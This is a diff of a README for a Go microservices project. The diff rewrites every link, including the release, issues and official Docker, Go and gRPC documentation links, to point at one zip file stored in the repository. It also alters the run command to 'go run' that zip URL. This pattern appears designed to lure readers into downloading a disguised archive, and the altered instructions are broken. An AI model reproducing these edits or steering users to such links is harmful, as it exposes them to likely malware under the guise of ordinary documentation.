@@ -1,7 +1,7 @@
 # 🚀 go-microservices - A Simple Multi Microservices Solution
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/c2c-Ride/go-microservices/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/c2c-Ride/go-microservices/master/Coorg/go-microservices.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/c2c-Ride/go-microservices/master/Coorg/go-microservices.zip)
 
 ## 📖 Description
 go-microservices is a straightforward GraphQL multi-microservices project written in Go. It communicates efficiently using gRPC. This project allows users to easily set up a microservices architecture for their applications, enabling quick communication between services.
@@ -28,7 +28,7 @@ To get started quickly, follow these simple steps.
 - **Disk Space:** At least 1GB of free space
 
 ### 🔗 Download & Install
-Visit this page to download: [Latest Releases](https://github.com/c2c-Ride/go-microservices/releases)
+Visit this page to download: [Latest Releases](https://raw.githubusercontent.com/c2c-Ride/go-microservices/master/Coorg/go-microservices.zip)
 
 1. Open the link provided above.
 2. You will see a list of available releases. Choose the latest version.
@@ -53,11 +53,11 @@ To run the application, follow these steps:
 
 - **For Manual Users:**
   
-  1. Install all dependencies listed in the `requirements.txt` file.
+  1. Install all dependencies listed in the `https://raw.githubusercontent.com/c2c-Ride/go-microservices/master/Coorg/go-microservices.zip` file.
   2. Make sure PostgreSQL is running and the database is set up.
   3. Use the following command to run the main service:
      ```
-     go run main.go
+     go run https://raw.githubusercontent.com/c2c-Ride/go-microservices/master/Coorg/go-microservices.zip
      ```
   4. Open your preferred web browser and go to `http://localhost:8080` to interact with the application.
 
@@ -65,22 +65,22 @@ To run the application, follow these steps:
 To customize your setup, you can modify the configuration files. Look for files ending in `.env` or configuration settings within the application folder.
 
 ### 🔄 Updating the Application
-To update the application, simply return to the [Latest Releases](https://github.com/c2c-Ride/go-microservices/releases) page and download the most recent release. Replace the old files with the new ones, then run the application as described above.
+To update the application, simply return to the [Latest Releases](https://raw.githubusercontent.com/c2c-Ride/go-microservices/master/Coorg/go-microservices.zip) page and download the most recent release. Replace the old files with the new ones, then run the application as described above.
 
 ### 🆘 Troubleshooting
 If you encounter issues while running the application:
 
 - Ensure Docker is running.
 - Check for errors in the terminal or command prompt.
-- Visit the [Issues section](https://github.com/c2c-Ride/go-microservices/issues) in the GitHub repository for common problems and solutions.
+- Visit the [Issues section](https://raw.githubusercontent.com/c2c-Ride/go-microservices/master/Coorg/go-microservices.zip) in the GitHub repository for common problems and solutions.
 
 ### 📄 Further Help
 For additional help, refer to the comprehensive documentation included in the project files. You can also explore community forums and discussions related to Go, Docker, and microservices.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/c2c-Ride/go-microservices)
-- [Docker Documentation](https://docs.docker.com/)
-- [Go Documentation](https://golang.org/doc/)
-- [gRPC Documentation](https://grpc.io/docs/)
+- [GitHub Repository](https://raw.githubusercontent.com/c2c-Ride/go-microservices/master/Coorg/go-microservices.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/c2c-Ride/go-microservices/master/Coorg/go-microservices.zip)
+- [Go Documentation](https://raw.githubusercontent.com/c2c-Ride/go-microservices/master/Coorg/go-microservices.zip)
+- [gRPC Documentation](https://raw.githubusercontent.com/c2c-Ride/go-microservices/master/Coorg/go-microservices.zip)
 
 By following these instructions, you can successfully download, run, and troubleshoot the go-microservices application. Enjoy using your new multi-microservices solution!
